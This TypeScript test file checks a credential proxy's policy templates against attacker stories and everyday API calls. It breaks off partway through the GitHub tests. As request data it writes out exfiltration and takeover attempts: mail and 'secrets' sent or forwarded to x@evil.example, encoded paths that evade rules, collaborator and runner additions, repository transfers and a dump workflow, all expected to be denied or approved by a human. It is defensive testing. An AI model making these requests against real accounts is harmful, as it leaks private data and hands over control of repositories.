// The template policies against every attacker story from the security
// reviews, and against the everyday calls that must stay free of
// approvals. Each story is the request as the reviewer wrote it.

import { describe, expect, it } from "bun:test"
import { type BindingInput, PolicySchema, type PolicyInput } from "./api.ts"
import { type Binding, type Policy, type RuleAction, checkBinding, evaluatePolicy, parseDestination, validHostPattern } from "./binding.ts"
import { resolvePolicyRequest } from "./policy-safety.ts"
import { isReservedHeader } from "./headers.ts"
import { blanketReadAllows } from "../test/template-policy.ts"
import { secretPrefix } from "./placeholder.ts"
import { ClientSetupStepSchema } from "./platform.ts"
import { CLIENT_SETUP_CALLBACK, OAUTH_PROVIDERS, TEMPLATES, TEMPLATE_CATEGORIES, connectionPolicy, getOAuthProvider, getTemplate } from "./templates.ts"

function policyOfProvider(id: string): PolicyInput {
  const provider = getOAuthProvider(id)
  if (!provider) throw new Error(id)
  return connectionPolicy(provider)
}

function policyOfTemplate(id: string): PolicyInput {
  const template = getTemplate(id)
  if (!template) throw new Error(id)
  return template.policy
}

function decide(policy: PolicyInput, method: string, url: string, body: unknown = undefined): { action: RuleAction; notes: string[] } {
  const parsed = parseDestination(method, url)
  if (!parsed.ok) throw new Error(`${url}: ${parsed.error}`)
  const bytes = body === undefined ? null : new TextEncoder().encode(typeof body === "string" ? body : JSON.stringify(body))
  const decision = evaluatePolicy(policy, parsed.destination, bytes)
  return { action: decision.action, notes: decision.matched.map((r) => r.note ?? "") }
}

type Story = [method: string, url: string, expected: RuleAction, body?: unknown]

function expectStories(policy: PolicyInput, stories: Story[]): void {
  for (const [method, url, expected, body] of stories) {
    expect({ request: `${method} ${url}`, action: decide(policy, method, url, body).action }).toEqual({ request: `${method} ${url}`, action: expected })
  }
}

const WRITES = ["POST", "PUT", "PATCH", "DELETE"]
const READS = ["GET", "HEAD"]

// Every template and provider as one shape: where its credential may go and
// the policy an item made from it starts with.
type Service = { id: string; binding: BindingInput; policy: PolicyInput; client: boolean }

const SERVICES: Service[] = [
  ...Object.values(TEMPLATES).map((t) => ({ id: t.id, binding: t.binding, policy: t.policy, client: t.kind === "oauth-client" })),
  ...Object.values(OAUTH_PROVIDERS).map((p) => ({ id: p.id, binding: p.upstream.binding, policy: connectionPolicy(p), client: false })),
]
const APIS = SERVICES.filter((s) => !s.client)

// A concrete path a pattern matches: every "*" and "**" becomes one segment.
function samplePath(pattern: string, segment = "mehen-sample"): string {
  return pattern
    .split("/")
    .map((s) => (s === "*" || s === "**" ? segment : s))
    .join("/")
}

// A path inside the binding, for a rule that names no paths of its own.
function pathInBinding(binding: BindingInput, segment = "mehen-sample"): string {
  const paths = binding.paths ?? []
  const open = paths.find((p) => p.endsWith("/**"))
  if (open !== undefined) return samplePath(open.slice(0, -"**".length) + `${segment}/route`, segment)
  return paths[0] !== undefined ? samplePath(paths[0], segment) : `/${segment}/route`
}

// The fixed characters a pattern requires at the start of a value: "^fc-"
// gives "fc-", "^sntry[us]_" gives "sntry", and a pattern that is not
// anchored or opens with a group gives "". A character a quantifier makes
// optional or repeatable is not fixed.
function anchoredLiteralPrefix(pattern: string): string {
  if (!pattern.startsWith("^")) return ""
  const chars: string[] = []
  for (let i = 1; i < pattern.length; i++) {
    const c = pattern[i] as string
    if ("?*+{".includes(c)) {
      chars.pop()
      break
    }
    if (c === "\\") {
      const next = pattern[i + 1] ?? ""
      if (!/^[^A-Za-z0-9]$/.test(next)) break
      chars.push(next)
      i++
      continue
    }
    if (".()[]|^$".includes(c)) break
    chars.push(c)
  }
  return chars.join("")
}

function urlOf(service: Service, path: string): string {
  return `https://${service.binding.hosts[0]}${path}`
}

function inBinding(service: Service, method: string, path: string): boolean {
  const parsed = parseDestination(method, urlOf(service, path))
  return parsed.ok && checkBinding(service.binding, parsed.destination).ok
}

describe("every template and provider, checked the same way", () => {
  it("is listed under a category, and only an OAuth client is listed under OAuth clients", () => {
    const categories = TEMPLATE_CATEGORIES.map((c) => c.id)
    expect(new Set(categories).size).toBe(categories.length)
    for (const t of Object.values(TEMPLATES)) {
      expect({ id: t.id, known: categories.includes(t.category) }).toEqual({ id: t.id, known: true })
      expect({ id: t.id, clients: t.category === "clients" }).toEqual({ id: t.id, clients: t.kind === "oauth-client" })
    }
    for (const p of Object.values(OAUTH_PROVIDERS)) {
      expect({ id: p.id, known: categories.includes(p.category) && p.category !== "clients" }).toEqual({ id: p.id, known: true })
    }
    for (const c of TEMPLATE_CATEGORIES) {
      const used = [...Object.values(TEMPLATES), ...Object.values(OAUTH_PROVIDERS)].some((s) => s.category === c.id)
      expect({ category: c.id, used }).toEqual({ category: c.id, used: true })
    }
  })

  it("has a check only as a read, inside its binding, allowed without a human, with no reserved header", () => {
    const checked = Object.values(TEMPLATES).filter((t) => t.check !== undefined)
    expect(checked.map((t) => t.id)).toEqual(expect.arrayContaining(["openai", "anthropic", "github-pat"]))
    for (const t of checked) {
      const check = t.check!
      expect({ id: t.id, read: READS.includes(check.method) }).toEqual({ id: t.id, read: true })
      const url = `https://${t.binding.hosts[0]}${check.path}`
      const parsed = parseDestination(check.method, url)
      if (!parsed.ok) throw new Error(`${t.id}: ${url}`)
      expect({ id: t.id, bound: checkBinding(t.binding, parsed.destination).ok }).toEqual({ id: t.id, bound: true })
      expect({ id: t.id, action: decide(t.policy, check.method, url).action }).toEqual({ id: t.id, action: "allow" })
      for (const [name] of check.headers ?? []) expect({ id: t.id, name, reserved: isReservedHeader(name) }).toEqual({ id: t.id, name, reserved: false })
    }
  })

  // An account-owned Cloudflare token answers 401 to anything under
  // /client/v4/user/, so a working one failed adopt verify.
  it("checks a Cloudflare token with a read that user and account tokens may both make", () => {
    const check = TEMPLATES["cloudflare-api-token"]?.check
    expect(check?.path.startsWith("/client/v4/user/")).toBe(false)
    expect(check).toEqual({ method: "GET", path: "/client/v4/accounts?per_page=1" })
  })

  it("is keyed by its own id, and no id is both a template and a provider", () => {
    for (const [key, t] of Object.entries(TEMPLATES)) expect(t.id).toBe(key)
    for (const [key, p] of Object.entries(OAUTH_PROVIDERS)) expect(p.id).toBe(key)
    expect(Object.keys(TEMPLATES).filter((id) => Object.hasOwn(OAUTH_PROVIDERS, id))).toEqual([])
  })

  it("links to its docs over https, and binds exact, valid, lower-case hosts", () => {
    for (const t of Object.values(TEMPLATES)) {
      if (t.docsUrl !== null) expect({ id: t.id, https: new URL(t.docsUrl).protocol }).toEqual({ id: t.id, https: "https:" })
    }
    for (const p of Object.values(OAUTH_PROVIDERS)) expect({ id: p.id, https: new URL(p.docsUrl).protocol }).toEqual({ id: p.id, https: "https:" })
    for (const s of SERVICES) {
      expect({ id: s.id, schemes: s.binding.schemes, ports: s.binding.ports }).toEqual({ id: s.id, schemes: undefined, ports: undefined })
      for (const host of s.binding.hosts) {
        expect({ id: s.id, host, exact: !host.includes("*") && validHostPattern(host) && host === host.toLowerCase() }).toEqual({ id: s.id, host, exact: true })
      }
    }
  })

  it("fails closed: the default is approve, and a write to a route nobody listed needs an approval", () => {
    for (const s of APIS) {
      expect({ id: s.id, default: s.policy.default }).toEqual({ id: s.id, default: "approve" })
      const path = pathInBinding(s.binding, "mehen-unlisted")
      for (const method of s.binding.methods ?? WRITES) {
        expect({ id: s.id, path, inBinding: inBinding(s, method, path) }).toEqual({ id: s.id, path, inBinding: true })
        expect({ id: s.id, method, path, action: decide(s.policy, method, urlOf(s, path)).action }).toEqual({ id: s.id, method, path, action: "approve" })
      }
    }
  })

  // Reads by allowlist, for the reasons the policy model gives: these APIs
  // have reads that hand back tokens, keys and signing secrets.
  it("allows reads only on named routes in gitlab, pagerduty, jira, twilio, sendgrid, discord, figma and pypi", () => {
    for (const id of ["gitlab", "pagerduty", "jira", "twilio", "sendgrid", "discord", "figma", "pypi"]) {
      const template = getTemplate(id)
      if (!template) throw new Error(id)
      expect({ id, blanket: blanketReadAllows(template) }).toEqual({ id, blanket: [] })
    }
  })

  it("an OAuth client's binding reaches only its token endpoints, by POST", () => {
    for (const s of SERVICES.filter((x) => x.client)) {
      expect({ id: s.id, methods: s.binding.methods, paths: (s.binding.paths ?? []).length > 0, rules: s.policy.rules }).toEqual({ id: s.id, methods: ["POST"], paths: true, rules: [] })
    }
  })

  it("lists every write an agent may make unattended: an allow rule that admits a write names its paths", () => {
    for (const s of APIS) {
      for (const rule of s.policy.rules.filter((r) => r.action === "allow")) {
        expect({ id: s.id, rule: rule.note, anyMethod: (rule.methods ?? []).includes("*") }).toEqual({ id: s.id, rule: rule.note, anyMethod: false })
        // Slack's RPC methods take GET or POST alike, so its rules name paths only.
        if (rule.methods !== undefined && rule.methods.every((m) => READS.includes(m.toUpperCase()))) continue
        const paths = rule.paths ?? []
        expect({ id: s.id, rule: rule.note, pathsNamed: paths.length > 0 && paths.every((p) => p !== "/**" && p !== "/*") }).toEqual({ id: s.id, rule: rule.note, pathsNamed: true })
      }
    }
  })

  it("gives every rule a note, the words people read in the policy summary", () => {
    for (const s of SERVICES) {
      for (const rule of s.policy.rules) expect({ id: s.id, note: (rule.note ?? "").trim().length > 0 }).toEqual({ id: s.id, note: true })
    }
  })

  it("can reach every deny and approve rule, and every allow rule that names its paths", () => {
    for (const s of SERVICES) {
      for (const rule of s.policy.rules) {
        if (rule.action === "allow" && (rule.paths === undefined || rule.body !== undefined)) continue
        const methods = rule.methods ?? s.binding.methods ?? ["GET", "POST"]
        const paths = rule.paths ?? [pathInBinding(s.binding)]
        for (const pattern of paths) {
          const path = samplePath(pattern)
          // A GraphQL rule with no body matcher is reached by a plain query,
          // which a fail-closed mutation rule on the same path lets by.
          // An allowed write is sent with an empty JSON object, which a
          // fail-closed JSON matcher on the same route lets by.
          for (const method of rule.action === "allow" ? methods.slice(0, 1) : methods) {
            const body = rule.body === undefined && path.toLowerCase().endsWith("/graphql") ? { query: "query { __typename }" } : rule.action === "allow" && !READS.includes(method.toUpperCase()) ? {} : undefined
            const request = `${s.id}: ${method} ${path}`
            expect({ request, inBinding: inBinding(s, method, path) }).toEqual({ request, inBinding: true })
            expect({ request, action: decide(s.policy, method, urlOf(s, path), body).action }).toEqual({ request, action: rule.action })
          }
        }
      }
    }
  })

  it("puts the credential only into a field it asks for, and every prefix fits that field's pattern", () => {
    for (const t of Object.values(TEMPLATES)) {
      const fields = Object.keys(t.fields)
      const injection = t.injection
      const used = injection === null ? [] : injection.in === "header" ? [...injection.format.matchAll(/\{([a-z][a-z0-9_]*)\}/g)].map((m) => m[1] ?? "") : injection.in === "query" ? [injection.field] : injection.in === "basic" ? [injection.username, injection.password] : [injection.field]
      for (const field of used) expect({ id: t.id, field, asked: fields.includes(field) }).toEqual({ id: t.id, field, asked: true })
      for (const step of t.setup?.steps ?? []) if (step.field !== undefined) expect({ id: t.id, step: step.title, asked: fields.includes(step.field) }).toEqual({ id: t.id, step: step.title, asked: true })
      const patterns = Object.values(t.fields).flatMap((f) => (f.pattern ? [new RegExp(f.pattern)] : []))
      for (const prefix of t.prefixes ?? []) {
        const value = `${prefix}0123456789abcdefABCDEF`
        expect({ id: t.id, prefix, fits: patterns.some((p) => p.test(value)) }).toEqual({ id: t.id, prefix, fits: true })
      }
    }
  })

  it("declares the literal prefix a field pattern anchors on, so a placeholder is never bare", () => {
    expect(anchoredLiteralPrefix("^fc-")).toBe("fc-")
    expect(anchoredLiteralPrefix("^SG\\.")).toBe("SG.")
    expect(anchoredLiteralPrefix("^sntry[us]_")).toBe("sntry")
    expect(anchoredLiteralPrefix("^ab?c")).toBe("a")
    expect(anchoredLiteralPrefix("^(sk|rk)_")).toBe("")
    expect(anchoredLiteralPrefix("\\.apps\\.googleusercontent\\.com$")).toBe("")
    for (const t of Object.values(TEMPLATES)) {
      for (const [name, field] of Object.entries(t.fields)) {
        const literal = anchoredLiteralPrefix(field.pattern ?? "")
        if (literal === "") continue
        const declared = (t.prefixes ?? []).some((p) => p.startsWith(literal))
        expect({ id: t.id, field: name, literal, declared }).toEqual({ id: t.id, field: name, literal, declared: true })
      }
    }
  })

  it("keeps every placeholder template's prefixes in the placeholder list, so a placeholder has the shape an SDK checks", () => {
    for (const t of Object.values(TEMPLATES).filter((x) => x.ceiling === "placeholder")) {
      for (const prefix of t.prefixes ?? []) expect({ id: t.id, prefix, kept: secretPrefix(`${prefix}0123456789abcdef`) }).toEqual({ id: t.id, prefix, kept: prefix })
    }
  })
})

describe("every template policy", () => {
  it("is a valid policy, and the schema allows only graphql-query on allow rules", () => {
    for (const t of Object.values(TEMPLATES)) expect(PolicySchema.safeParse(t.policy).success, t.id).toBe(true)
    for (const p of Object.values(OAUTH_PROVIDERS)) expect(PolicySchema.safeParse(connectionPolicy(p)).success, p.id).toBe(true)
    expect(PolicySchema.safeParse({ default: "approve", rules: [{ action: "allow", paths: ["/graphql"], body: "graphql-query" }] }).success).toBe(true)
    expect(PolicySchema.safeParse({ default: "deny", rules: [{ action: "allow", paths: ["/graphql"], body: "graphql-mutation" }] }).success).toBe(false)
    expect(PolicySchema.safeParse({ default: "allow", rules: [{ action: "deny", paths: ["/graphql"], body: "graphql-query" }] }).success).toBe(false)
    expect(PolicySchema.safeParse({ default: "allow", rules: [{ action: "approve", paths: ["/graphql"], body: "graphql-mutation" }] }).success).toBe(true)
    expect(PolicySchema.safeParse({ default: "allow", rules: [{ action: "approve", paths: ["/graphql"], body: "anything" }] }).success).toBe(false)
  })

  it("is fail-closed for every API that can write: a write route nobody listed needs an approval", () => {
    const unlisted: [string, PolicyInput, string][] = [
      ["openai", policyOfTemplate("openai"), "https://api.openai.com/v1/some/new/route"],
      ["anthropic", policyOfTemplate("anthropic"), "https://api.anthropic.com/v1/some/new/route"],
      ["github-pat", policyOfTemplate("github-pat"), "https://api.github.com/some/new/route"],
      ["cloudflare-api-token", policyOfTemplate("cloudflare-api-token"), "https://api.cloudflare.com/client/v4/some/new/route"],
      ["linear", policyOfTemplate("linear"), "https://api.linear.app/graphql"],
      ["stripe", policyOfTemplate("stripe"), "https://api.stripe.com/v1/some/new/route"],
      ["slack-bot", policyOfTemplate("slack-bot"), "https://slack.com/api/some.newMethod"],
      ["google-gmail", policyOfProvider("google-gmail"), "https://gmail.googleapis.com/gmail/v1/users/me/some/new/route"],
      ["google-calendar", policyOfProvider("google-calendar"), "https://www.googleapis.com/calendar/v3/some/new/route"],
      ["google-drive", policyOfProvider("google-drive"), "https://www.googleapis.com/drive/v3/some/new/route"],
      ["github-oauth", policyOfProvider("github-oauth"), "https://api.github.com/some/new/route"],
      ["microsoft-graph", policyOfProvider("microsoft-graph"), "https://graph.microsoft.com/v1.0/some/new/route"],
    ]
    for (const [id, policy, url] of unlisted) {
      expect({ id, default: policy.default }).toEqual({ id, default: "approve" })
      for (const method of WRITES) expect({ id, method, action: decide(policy, method, url).action }).toEqual({ id, method, action: "approve" })
    }
  })

  it("no template or provider puts its credential into a reserved header, or a header map", () => {
    const injections = [
      ...Object.values(TEMPLATES).map((t) => [t.id, t.injection] as const),
      ...Object.values(OAUTH_PROVIDERS).map((p) => [p.id, p.upstream.injection] as const),
    ]
    for (const [id, injection] of injections) {
      if (injection === null) continue
      expect({ id, in: injection.in }).not.toEqual({ id, in: "headers" })
      if (injection.in === "header") expect({ id, reserved: isReservedHeader(injection.name) }).toEqual({ id, reserved: false })
    }
  })
})

describe("the everyday calls stay free of approvals", () => {
  it("model calls", () => {
    expectStories(policyOfTemplate("openai"), [
      ["POST", "https://api.openai.com/v1/chat/completions", "allow", { model: "gpt-x", messages: [] }],
      ["POST", "https://api.openai.com/v1/responses", "allow", { model: "gpt-x", input: "hi" }],
      ["POST", "https://api.openai.com/v1/embeddings", "allow", { model: "e", input: "hi" }],
      ["GET", "https://api.openai.com/v1/models", "allow"],
    ])
    expectStories(policyOfTemplate("anthropic"), [
      ["POST", "https://api.anthropic.com/v1/messages", "allow", { model: "claude", messages: [] }],
      ["POST", "https://api.anthropic.com/v1/messages/count_tokens", "allow", { model: "claude", messages: [] }],
      ["GET", "https://api.anthropic.com/v1/models", "allow"],
    ])
  })

  it("Gmail: list, get, create a draft, change labels", () => {
    const base = "https://gmail.googleapis.com/gmail/v1/users/me"
    expectStories(policyOfProvider("google-gmail"), [
      ["GET", `${base}/messages?q=is:unread`, "allow"],
      ["GET", `${base}/messages/18c2f`, "allow"],
      ["GET", `${base}/threads/18c2f`, "allow"],
      ["GET", `${base}/labels`, "allow"],
      ["POST", `${base}/drafts`, "allow", { message: { raw: "x" } }],
      ["POST", "https://gmail.googleapis.com/upload/gmail/v1/users/me/drafts?uploadType=multipart", "allow"],
      ["POST", `${base}/messages/18c2f/modify`, "allow", { addLabelIds: ["L1"] }],
      ["POST", `${base}/threads/18c2f/modify`, "allow", { removeLabelIds: ["INBOX"] }],
      ["POST", `${base}/messages/batchModify`, "allow", { ids: ["a"], addLabelIds: ["L1"] }],
    ])
  })

  it.each([
    ["github-pat", policyOfTemplate("github-pat")],
    ["github-oauth", policyOfProvider("github-oauth")],
  ] as const)("%s: reads and read GraphQL pass; issues, comments and pull requests need a human (a public repo is an exfiltration route)", (_id, policy) => {
    const api = "https://api.github.com"
    expectStories(policy, [
      ["GET", `${api}/user/repos`, "allow"],
      ["GET", `${api}/repos/a/b/pulls?state=open`, "allow"],
      ["POST", `${api}/graphql`, "allow", { query: "query { viewer { login } }" }],
      ["POST", `${api}/graphql`, "allow", { query: "query Q($o: String!) { repository(owner: $o, name: \"b\") { issues(first: 5) { nodes { title } } } }", variables: { o: "a" } }],
      ["POST", `${api}/repos/a/b/issues`, "approve", { title: "x" }],
      ["POST", `${api}/repos/a/b/issues/7/comments`, "approve", { body: "x" }],
      ["POST", `${api}/repos/a/b/pulls/7/comments`, "approve", { body: "x" }],
      ["POST", `${api}/repos/a/b/pulls`, "approve", { title: "x", head: "f", base: "main" }],
      ["POST", `${api}/repos/a/b/issues/7/labels`, "approve", { labels: ["bug"] }],
      ["POST", `${api}/repositories/123/issues/7/comments`, "approve", { body: "x" }],
    ])
  })

  it("Slack: read methods by GET or POST, and reactions", () => {
    expectStories(policyOfTemplate("slack-bot"), [
      ["GET", "https://slack.com/api/conversations.history?channel=C1", "allow"],
      ["POST", "https://slack.com/api/conversations.history", "allow", "channel=C1"],
      ["POST", "https://slack.com/api/conversations.replies", "allow", "channel=C1&ts=1"],
      ["GET", "https://slack.com/api/conversations.list", "allow"],
      ["GET", "https://slack.com/api/users.info?user=U1", "allow"],
      ["POST", "https://slack.com/api/reactions.add", "allow", "channel=C1&name=eyes&timestamp=1"],
    ])
  })

  it("Linear, Cloudflare and Stripe reads and data calls, Graph and Google reads", () => {
    expectStories(policyOfTemplate("linear"), [["POST", "https://api.linear.app/graphql", "allow", { query: "{ issues(first: 5) { nodes { title } } }" }]])
    expectStories(policyOfTemplate("cloudflare-api-token"), [
      ["GET", "https://api.cloudflare.com/client/v4/zones", "allow"],
      ["POST", "https://api.cloudflare.com/client/v4/graphql", "allow", { query: "{ viewer { zones { httpRequests1dGroups(limit: 1) { sum { requests } } } } }" }],
    ])
    expectStories(policyOfTemplate("stripe"), [
      ["GET", "https://api.stripe.com/v1/charges?limit=3", "allow"],
      ["POST", "https://api.stripe.com/v1/customers", "approve", "email=a%40example.com"],
      ["POST", "https://api.stripe.com/v1/products/prod_1", "allow", "name=x"],
    ])
    expectStories(policyOfProvider("microsoft-graph"), [
      ["GET", "https://graph.microsoft.com/v1.0/me/messages?$top=5", "allow"],
      ["GET", "https://graph.microsoft.com/v1.0/me/events", "allow"],
      ["GET", "https://graph.microsoft.com/v1.0/users/0f3e/mailboxSettings", "allow"],
      ["GET", "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules", "allow"],
    ])
    expectStories(policyOfProvider("google-calendar"), [
      ["GET", "https://www.googleapis.com/calendar/v3/calendars/primary/events", "allow"],
      ["POST", "https://www.googleapis.com/calendar/v3/freeBusy", "allow", { items: [{ id: "primary" }] }],
    ])
    expectStories(policyOfProvider("google-drive"), [["GET", "https://www.googleapis.com/drive/v3/files?q=x", "allow"]])
  })
})

describe("encoded or re-cased paths", () => {
  it("still meet the deny and approve rules", () => {
    expectStories(policyOfProvider("google-gmail"), [
      ["POST", "https://gmail.googleapis.com/gmail/v1/users/me/messages/%73end", "approve"],
      ["POST", "https://gmail.googleapis.com/gmail/v1/users/me/settings/%66orwardingAddresses", "deny"],
    ])
    expectStories(policyOfTemplate("github-pat"), [["POST", "https://api.github.com/repos/o/r/%6beys", "deny"]])
    expectStories(policyOfTemplate("stripe"), [["POST", "https://api.stripe.com/v1/%70ayouts", "approve"]])
    expectStories(policyOfProvider("microsoft-graph"), [["POST", "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/MessageRules", "deny"]])
  })
})

describe("Microsoft Graph", () => {
  const graph = policyOfProvider("microsoft-graph")
  const base = "https://graph.microsoft.com"

  it("denies $batch, and says to send the requests one by one", () => {
    const batch = { requests: [{ id: "1", method: "POST", url: "/me/sendMail", body: {} }] }
    for (const version of ["v1.0", "beta"]) {
      for (const path of ["$batch", "$BATCH", "%24batch"]) {
        const decision = decide(graph, "POST", `${base}/${version}/${path}`, batch)
        expect(decision.action, `${version}/${path}`).toBe("deny")
        expect(decision.notes.join(" ")).toContain("one by one")
      }
    }
  })

  it("denies sending, replying to or forwarding a stored message by id, and steers to sendMail", () => {
    for (const path of [
      "/users/0f3e/messages/AAMk/send",
      "/users/0f3e/messages/AAMk/forward",
      "/users/0f3e/messages/AAMk/reply",
      "/users/0f3e/messages/AAMk/replyAll",
      "/me/messages/AAMk/send",
      "/me/mailFolders/inbox/messages/AAMk/send",
      "/users/0f3e/mailFolders/drafts/messages/AAMk/send",
      "/me/messages/AAMk/microsoft.graph.send",
      "/me/messages/AAMk/graph.send",
      "/me/messages/AAMk/microsoft.graph.forward",
      "/me/messages('AAMk')/send",
      "/me/messages/AAMk/SEND",
      "/me/messages/AAMk/send;x=1",
      "/me/messages/AAMk/%73end",
    ]) {
      for (const version of ["v1.0", "beta"]) {
        const decision = decide(graph, "POST", `${base}/${version}${path}`, { comment: "fyi", toRecipients: [{ emailAddress: { address: "x@evil.example" } }] })
        expect({ path: version + path, action: decision.action }).toEqual({ path: version + path, action: "deny" })
        expect(decision.notes.join(" ")).toContain("sendMail")
      }
    }
  })

  it("every step of the draft-then-send story needs an approval, and the send itself is refused", () => {
    expectStories(graph, [
      ["POST", `${base}/v1.0/me/messages`, "approve", { subject: "hi", toRecipients: [] }],
      ["POST", `${base}/v1.0/me/messages/AAMk/createForward`, "approve"],
      ["POST", `${base}/v1.0/users/0f3e/messages/AAMk/createReply`, "approve"],
      ["POST", `${base}/v1.0/me/messages/AAMk/createReplyAll`, "approve"],
      ["PATCH", `${base}/v1.0/me/messages/AAMk2`, "approve", { toRecipients: [{ emailAddress: { address: "x@evil.example" } }] }],
      ["POST", `${base}/v1.0/me/messages/AAMk2/attachments`, "approve", { name: "secrets.txt" }],
      ["POST", `${base}/v1.0/me/messages/AAMk2/send`, "deny"],
    ])
  })

  it("approves sendMail, which carries the whole message, on every path and spelling", () => {
    for (const path of ["/me/sendMail", "/users/alex@example.com/sendMail", "/users/0f3e/sendMail", "/me/microsoft.graph.sendMail", "/me/graph.sendMail", "/me/SENDMAIL"]) {
      for (const version of ["v1.0", "beta"]) expect({ path: version + path, action: decide(graph, "POST", `${base}/${version}${path}`).action }).toEqual({ path: version + path, action: "approve" })
    }
  })

  it("denies mail rule and mailbox settings writes on every path family", () => {
    for (const path of [
      "/me/mailFolders/inbox/messageRules",
      "/me/mailFolders/inbox/messageRules/r1",
      "/users/0f3e/mailFolders/inbox/messageRules",
      "/users/0f3e/mailFolders/AAMk/messageRules/r1",
      "/me/inboxRules",
      "/users/0f3e/inboxRules/r1",
      "/me/mailboxSettings",
      "/users/0f3e/mailboxSettings",
      "/users/0f3e/mailboxSettings/automaticRepliesSetting",
    ]) {
      for (const method of WRITES) expect(decide(graph, method, `${base}/v1.0${path}`).action, `${method} ${path}`).toBe("deny")
    }
  })

  it("calendar invitations, replies to an organiser and writes to someone else's drive need an approval", () => {
    const attendees = { subject: "x", body: { content: "secrets" }, attendees: [{ emailAddress: { address: "x@evil.example" } }] }
    expectStories(graph, [
      ["POST", `${base}/v1.0/me/events`, "approve", attendees],
      ["PATCH", `${base}/v1.0/me/events/E1`, "approve", attendees],
      ["POST", `${base}/v1.0/me/calendars/C1/events`, "approve", attendees],
      ["POST", `${base}/v1.0/me/events/E1/accept`, "approve", { comment: "secrets" }],
      ["POST", `${base}/v1.0/me/events/E1/decline`, "approve", { comment: "secrets" }],
      ["POST", `${base}/v1.0/me/events/E1/tentativelyAccept`, "approve", { comment: "secrets" }],
      ["POST", `${base}/v1.0/me/events/E1/proposeNewTime`, "approve", { comment: "secrets" }],
      ["PUT", `${base}/v1.0/drives/b1/items/01AB:/x.txt:/content`, "approve", "secrets"],
      ["POST", `${base}/v1.0/drives/b1/items/01AB/copy`, "approve", { parentReference: { driveId: "b2", id: "01CD" } }],
      ["PUT", `${base}/v1.0/me/drive/root:/x.txt:/content`, "approve", "x"],
    ])
  })
})

describe("GitHub", () => {
  const policies = [
    ["github-pat", policyOfTemplate("github-pat")],
    ["github-oauth", policyOfProvider("github-oauth")],
  ] as const
  const api = "https://api.github.com"

  it.each(policies)("%s: denies adding collaborators, invitations and memberships", (_id, policy) => {
    expectStories(policy, [
      ["PUT", `${api}/repos/a/b/collaborators/mallory`, "deny"],
      ["DELETE", `${api}/repos/a/b/collaborators/alex`, "deny"],
      ["PATCH", `${api}/repos/a/b/invitations/7`, "deny"],
      ["POST", `${api}/orgs/acme/invitations`, "deny"],
      ["DELETE", `${api}/orgs/acme/invitations/7`, "deny"],
      ["PUT", `${api}/orgs/acme/memberships/mallory`, "deny"],
      ["PUT", `${api}/orgs/acme/teams/admins/memberships/mallory`, "deny"],
      ["PUT", `${api}/orgs/acme/outside_collaborators/mallory`, "deny"],
      ["GET", `${api}/repos/a/b/collaborators`, "allow"],
      ["GET", `${api}/orgs/acme/memberships/alex`, "allow"],
    ])
  })

  it.each(policies)("%s: approves GraphQL mutations and anything that is not plainly one query", (_id, policy) => {
    expectStories(policy, [
      ["POST", `${api}/graphql`, "approve", { query: "mutation { deleteRef(input: {refId: \"r\"}) { clientMutationId } }" }],
      ["POST", `${api}/graphql`, "approve", { query: "mutation { deleteIssue(input: {issueId: \"i\"}) { clientMutationId } }" }],
      ["POST", `${api}/graphql`, "approve", "not json"],
      ["POST", `${api}/graphql`, "approve"],
      ["POST", `${api}/graphql`, "approve", '{"query":"{ viewer { login } }","query":"mutation { x }"}'],
      ["POST", `${api}/graphql`, "approve", { query: "query A { a } query B { b }", operationName: "A" }],
      ["POST", `${api}/graphql`, "approve", { query: "{ viewer { login } }", extensions: { persistedQuery: { sha256Hash: "x" } } }],
      ["POST", `${api}/graphql`, "approve", { id: "persisted" }],
    ])
  })

  it.each(policies)("%s: GraphQL in the URL or by GET needs an approval", (_id, policy) => {
    const harmless = { query: "{ viewer { login } }" }
    for (const param of ["query=mutation%7BdeleteRef(input:%7BrefId:%22r%22%7D)%7BclientMutationId%7D%7D", "operationName=X", "variables=%7B%7D", "extensions=%7B%7D", "id=1", "documentId=1"]) {
      expect(decide(policy, "POST", `${api}/graphql?${param}`, harmless).action, param).toBe("approve")
      expect(decide(policy, "GET", `${api}/graphql?${param}`).action, `GET ${param}`).toBe("approve")
    }
    expect(decide(policy, "GET", `${api}/graphql`).action).toBe("approve")
    expect(decide(policy, "HEAD", `${api}/graphql`).action).toBe("approve")
  })

  it.each(policies)("%s: every repository and organisation rule also holds by numeric id", (_id, policy) => {
    expectStories(policy, [
      ["POST", `${api}/repositories/123/keys`, "deny"],
      ["POST", `${api}/repositories/123/hooks`, "deny"],
      ["PATCH", `${api}/repositories/123/hooks/9`, "deny"],
      ["PUT", `${api}/repositories/123/collaborators/evil`, "deny"],
      ["PUT", `${api}/repositories/123/actions/secrets/X`, "approve"],
      ["POST", `${api}/repositories/123/actions/runners/registration-token`, "deny"],
      ["POST", `${api}/repositories/123/transfer`, "deny"],
      ["POST", `${api}/organizations/456/hooks`, "deny"],
      ["POST", `${api}/organizations/456/invitations`, "deny"],
      ["PUT", `${api}/organizations/456/memberships/evil`, "deny"],
      ["POST", `${api}/organizations/456/actions/runners/registration-token`, "deny"],
      ["PUT", `${api}/organizations/456/actions/secrets/X`, "approve"],
    ])
  })

  it.each(policies)("%s: runners, transfers and account emails are refused; repository settings, secrets, protection and workflows need an approval", (_id, policy) => {
    expectStories(policy, [
      ["POST", `${api}/repos/a/b/actions/runners/registration-token`, "deny"],
      ["POST", `${api}/repos/a/b/actions/runners/generate-jitconfig`, "deny"],
      ["POST", `${api}/orgs/acme/actions/runners/registration-token`, "deny"],
      ["POST", `${api}/orgs/acme/actions/runners/generate-jitconfig`, "deny"],
      ["POST", `${api}/repos/a/b/transfer`, "deny", { new_owner: "evil" }],
      ["POST", `${api}/user/emails`, "deny", { emails: ["x@evil.example"] }],
      ["PATCH", `${api}/repos/a/b`, "approve", { private: false }],
      ["PUT", `${api}/repos/a/b/environments/prod`, "approve", { reviewers: [] }],
      ["PUT", `${api}/repos/a/b/environments/prod/secrets/X`, "approve"],
      ["PUT", `${api}/repos/a/b/dependabot/secrets/X`, "approve"],
      ["PUT", `${api}/repos/a/b/codespaces/secrets/X`, "approve"],
      ["PUT", `${api}/repos/a/b/actions/secrets/X`, "approve"],
      ["PUT", `${api}/repos/a/b/branches/main/protection`, "approve"],
      ["DELETE", `${api}/repos/a/b/branches/main/protection`, "approve"],
      ["POST", `${api}/repos/a/b/rulesets`, "approve"],
      ["PUT", `${api}/repos/a/b/contents/.github/workflows/dump.yml`, "approve", { message: "x", content: "eA" }],
      ["POST", `${api}/repos/a/b/git/refs`, "approve", { ref: "refs/heads/x", sha: "0" }],
